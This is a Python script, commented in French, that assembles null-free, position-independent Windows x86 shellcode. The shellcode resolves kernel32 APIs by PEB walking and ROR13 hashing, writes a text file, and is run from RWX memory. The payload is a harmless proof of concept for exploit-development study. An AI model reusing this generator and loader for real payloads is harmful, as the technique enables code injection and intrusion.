# =============================================================================
#  SHELLCODE - Ecrit un texte choisi dans un fichier choisi
# =============================================================================
#
#  Sequence (100% kernel32) :
#    CreateFileA(chemin, GENERIC_WRITE, CREATE_ALWAYS) -> WriteFile(texte)
#    -> CloseHandle -> TerminateProcess
#
#  CREATE_ALWAYS : cree le fichier, ou ecrase son contenu s'il existe deja.
#  Null-free et position-independent. Tourne SANS WinDbg.
# =============================================================================

from keystone import *
import ctypes
import os
import sys

# =============================================================================
#  CONFIGURATION
# =============================================================================

CHEMIN  = r"C:\Users\Public\shellcode_poc.txt"      # Fichier de destination
CONTENU = "Ecrit par shellcode.\r\n"                # Texte a ecrire

# Table des symboles : nom -> emplacement (offset EBP) ou ranger sa VMA resolue.
# [ebp+0x04] est reserve a &find_function ; les VMA commencent a [ebp+0x08].
SYMBOLES = {
    "CreateFileA":      0x08,
    "WriteFile":        0x0C,
    "CloseHandle":      0x10,
    "TerminateProcess": 0x14,
}

# Emplacements des variables (toujours adresses en EBP-relatif).
OFF_HFILE        = 0x18              # DWORD : handle du fichier (CreateFileA)
OFF_BYTESWRITTEN = 0x1C             # DWORD : octets ecrits (out de WriteFile)

# Longueur exacte a ecrire (sans terminateur ni padding) - connue a la generation.
LONGUEUR = len(CONTENU.encode("latin-1"))


# =============================================================================
#  HACHAGE (ROR13)
# =============================================================================
def ror32(value, count):
    value &= 0xFFFFFFFF
    return ((value >> count) | (value << (32 - count))) & 0xFFFFFFFF


def custom_hash(name: str) -> int:
    accumulateur = 0
    for index, caractere in enumerate(name):
        accumulateur = (accumulateur + ord(caractere)) & 0xFFFFFFFF
        if index < len(name) - 1:           # Pas de rotation apres le dernier caractere
            accumulateur = ror32(accumulateur, 0x0D)
    return accumulateur


def verifier_hash(name: str) -> int:
    h = custom_hash(name)
    if 0 in h.to_bytes(4, "little"):
        print(f"[i] {name} : hash {h:#010x} contient un octet NULL "
              f"-> pousse en 2 temps (mov/xor) par push_dword_asm.")
    return h


# =============================================================================
#  GENERATEURS D'ASSEMBLEUR (helpers)
# =============================================================================
def push_dword_asm(value: int) -> str:
    # Pousse un immediat 32 bits sur la pile SANS aucun octet nul dans les opcodes.
    # Si la valeur est deja null-free -> push direct. Sinon on l'ecrit en deux
    # temps : eax = (value XOR mask) puis xor eax, mask (les deux operandes etant
    # null-free par construction). Clobber : EAX
    value &= 0xFFFFFFFF
    octets = value.to_bytes(4, "little")
    if 0 not in octets:
        return f"push {value:#010x}\n"
    mask = bytearray(4)
    imm = bytearray(4)
    for i, b in enumerate(octets):
        m = 0xFF if b != 0xFF else 0x01   # m != 0 et m != b -> imm et mask sans null
        mask[i] = m
        imm[i] = b ^ m
    imm_v = int.from_bytes(imm, "little")
    mask_v = int.from_bytes(mask, "little")
    return (f"mov eax, {imm_v:#010x}\n"
            f"xor eax, {mask_v:#010x}\n"
            "push eax\n")


def push_string_asm(text: str) -> str:
    # Empile 'text' (termine par un octet nul) sur la pile, sans null byte dans
    # les opcodes. Apres execution, ESP pointe sur le debut de la chaine.
    # Clobber : EAX.
    data = text.encode("latin-1") + b"\x00"
    while len(data) % 4 != 0:
        data += b"\x00"                       # Padding nul pour aligner sur 4 octets

    dwords = [data[i:i + 4] for i in range(0, len(data), 4)]
    lignes = []
    for chunk in reversed(dwords):            # On empile du dernier au premier
        if 0 not in chunk:                    # Dword 100% ASCII -> push direct
            valeur = int.from_bytes(chunk, "little")
            lignes.append(f"push {valeur:#010x}")
        else:                                 # Dword du terminateur -> a fabriquer
            non_nuls = sum(1 for b in chunk if b != 0)
            if non_nuls == 3:                 # 3 octets utiles + 1 nul en haut
                valeur = int.from_bytes(chunk, "little")
                imm = ((valeur << 8) | 0xFF) & 0xFFFFFFFF
                lignes.append(f"mov eax, {imm:#010x}")
                lignes.append("shr eax, 8")
                lignes.append("push eax")
            else:
                lignes.append("xor eax, eax")
                if non_nuls == 1:
                    lignes.append(f"mov al, {chunk[0]:#x}")
                elif non_nuls == 2:
                    bas = int.from_bytes(chunk[:2], "little")
                    lignes.append(f"mov ax, {bas:#x}")
                lignes.append("push eax")
    return "".join(l + "\n" for l in lignes)


def resoudre_asm(name: str) -> str:
    # Genere : push <hash> (null-free) ; call find_function ; range la VMA.
    h = verifier_hash(name)
    print(f"[*] Hash {name:<24} = {h:#010x}")
    return (push_dword_asm(h)
            + "call dword ptr [ebp+0x04]\n"
            + f"mov [ebp+{SYMBOLES[name]:#x}], eax\n")


def appel_asm(name: str) -> str:
    # Genere l'appel indirect d'une fonction deja resolue.
    return f"call dword ptr [ebp+{SYMBOLES[name]:#x}]\n"


# =============================================================================
#  PLOMBERIE (find_kernel32 + find_function)
# =============================================================================
PLOMBERIE = (
    # --- Prologue ---
    "start:\n"
    # "int3\n"                       # Point d'arret WinDbg
    "mov ebp, esp\n"                 # EBP = point de reference fixe (memory_segment)
    "add esp, 0xfffff0f0\n"          # Reserve ~0xF10 octets de travail, sans null byte

    # --- find_kernel32 : EBX = base de kernel32.dll via le PEB ---
    "find_kernel32:\n"
    "xor ecx, ecx\n"
    "mov esi, fs:[ecx+0x30]\n"       # ESI = PEB
    "mov esi, [esi+0x0C]\n"          # ESI = PEB->Ldr
    "mov esi, [esi+0x1C]\n"          # ESI = InInitializationOrderModuleList
    "next_module:\n"
    "mov ebx, [esi+0x08]\n"          # EBX = base du module courant
    "mov edi, [esi+0x20]\n"          # EDI = nom du module (UNICODE)
    "mov esi, [esi]\n"               # ESI = entree suivante (Flink)
    "cmp [edi+0x18], cx\n"           # Nom de 12 caracteres (kernel32.dll) ?
    "jne next_module\n"

    # --- Recuperation de &find_function sans call vers l'avant (anti-null) ---
    "find_function_shorten:\n"
    "jmp find_function_shorten_bnc\n"
    "find_function_ret:\n"
    "pop esi\n"
    "mov [ebp+0x04], esi\n"          # &find_function pour les appels indirects
    "jmp resolve_symbols\n"
    "find_function_shorten_bnc:\n"
    "call find_function_ret\n"

    # --- find_function : EBX = base DLL ; hash sur la pile -> EAX = VMA ---
    "find_function:\n"
    "pushad\n"
    "mov eax, [ebx+0x3C]\n"
    "mov edi, [ebx+eax+0x78]\n"
    "add edi, ebx\n"
    "mov ecx, [edi+0x18]\n"
    "mov eax, [edi+0x20]\n"
    "add eax, ebx\n"
    "mov [ebp-4], eax\n"
    "find_function_loop:\n"
    "jecxz find_function_finished\n"
    "dec ecx\n"
    "mov eax, [ebp-4]\n"
    "mov esi, [eax+ecx*4]\n"
    "add esi, ebx\n"
    "compute_hash:\n"
    "xor eax, eax\n"
    "cdq\n"
    "cld\n"
    "compute_hash_again:\n"
    "lodsb\n"
    "test al, al\n"
    "jz compute_hash_finished\n"
    "ror edx, 0x0D\n"
    "add edx, eax\n"
    "jmp compute_hash_again\n"
    "compute_hash_finished:\n"
    "find_function_compare:\n"
    "cmp edx, [esp+0x24]\n"
    "jnz find_function_loop\n"
    "mov edx, [edi+0x24]\n"
    "add edx, ebx\n"
    "mov cx, [edx+ecx*2]\n"
    "mov edx, [edi+0x1C]\n"
    "add edx, ebx\n"
    "mov eax, [edx+ecx*4]\n"
    "add eax, ebx\n"
    "mov [esp+0x1C], eax\n"
    "find_function_finished:\n"
    "popad\n"
    "ret\n"
)


# =============================================================================
#  RESOLUTION DES SYMBOLES
# =============================================================================
#  Toutes les fonctions sont dans kernel32 (EBX = kernel32 a ce stade).
RESOLUTION = (
    "resolve_symbols:\n"
    + resoudre_asm("CreateFileA")
    + resoudre_asm("WriteFile")
    + resoudre_asm("CloseHandle")
    + resoudre_asm("TerminateProcess")
)


# =============================================================================
#  SEQUENCE D'ACTIONS
# =============================================================================
ACTIONS = (
    # --- CreateFileA(chemin, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0) ---
    push_string_asm(CHEMIN)
    + "mov esi, esp\n"                       # ESI -> chemin
    + "xor ecx, ecx\n"                       # ECX = 0 (sert pour les args nuls)
    + "push ecx\n"                           # hTemplateFile = 0
    + "push ecx\n"                           # dwFlagsAndAttributes = 0
    + "push 0x2\n"                           # dwCreationDisposition = CREATE_ALWAYS
    + "push ecx\n"                           # lpSecurityAttributes = 0
    + "push ecx\n"                           # dwShareMode = 0
    + "xor eax, eax\n"                       # GENERIC_WRITE = 0x40000000 (sans null) :
    + "inc eax\n"                            #   eax = 1
    + "ror eax, 2\n"                         #   eax = 0x40000000
    + "push eax\n"                           # dwDesiredAccess = GENERIC_WRITE
    + "push esi\n"                           # lpFileName = chemin
    + appel_asm("CreateFileA")
    + f"mov [ebp+{OFF_HFILE:#x}], eax\n"     # hFile

    # --- WriteFile(hFile, texte, LONGUEUR, &bytesWritten, NULL) ---
    + push_string_asm(CONTENU)               # texte sur la pile (+ \0 + padding)
    + "mov esi, esp\n"                       # ESI -> texte
    + "xor ecx, ecx\n"
    + "push ecx\n"                           # lpOverlapped = NULL
    + f"lea eax, [ebp+{OFF_BYTESWRITTEN:#x}]\n"
    + "push eax\n"                           # lpNumberOfBytesWritten = &bytesWritten
    + push_dword_asm(LONGUEUR)               # nNumberOfBytesToWrite = LONGUEUR (octets utiles)
    + "push esi\n"                           # lpBuffer = texte
    + f"push dword ptr [ebp+{OFF_HFILE:#x}]\n"  # hFile
    + appel_asm("WriteFile")

    # --- CloseHandle(hFile) : flush sur le disque ---
    + f"push dword ptr [ebp+{OFF_HFILE:#x}]\n"
    + appel_asm("CloseHandle")

    # --- Sortie propre : TerminateProcess(-1, 0) ---
    + "xor ecx, ecx\n"
    + "push ecx\n"
    + "push 0xffffffff\n"
    + appel_asm("TerminateProcess")
)


CODE = PLOMBERIE + RESOLUTION + ACTIONS


# =============================================================================
#  HARNESS PYTHON
# =============================================================================
if sys.maxsize > 2**32:
    print("[!] Lance ce script avec Python x86 (32-bit)")
    sys.exit(1)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
shellcode = bytes(encoding)

nulls = shellcode.count(0x00)
print(f"[*] {count} instructions assemblees")
print(f"[*] Shellcode ({len(shellcode)} bytes): {shellcode.hex()}")
print(f"[*] Null bytes: {nulls}")
print(f"[*] Va ecrire {LONGUEUR} octets dans : {CHEMIN}")

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
addr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.memmove(addr, shellcode, len(shellcode))
print(f"[*] Shellcode @ 0x{addr:08X}")

input("[*] Attacher WinDbg maintenant puis appuyer sur Entree...")
ctypes.CFUNCTYPE(None)(addr)()
print("[!] Pas termine : TerminateProcess n'a PAS ete appele (probleme).")
